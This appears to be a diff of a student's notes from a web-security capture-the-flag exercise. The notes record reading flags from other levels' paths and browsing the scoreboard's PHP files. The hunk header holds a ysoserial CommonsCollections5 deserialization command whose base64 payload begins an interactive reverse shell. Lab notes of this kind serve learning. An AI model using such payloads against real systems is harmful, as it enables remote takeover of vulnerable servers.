@@ -29,5 +29,4 @@ java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZ
             - took a look at the flag for social again. see that the flag was in level01, would /var/websec/wwwstudent_12/level06 work?
                 - it does, really nice. Tried flag.txt and this time it worked
 
-
-
+- please don't mind me looking around the scoreboard PHP files. Too bad there are no bonusses anymore...
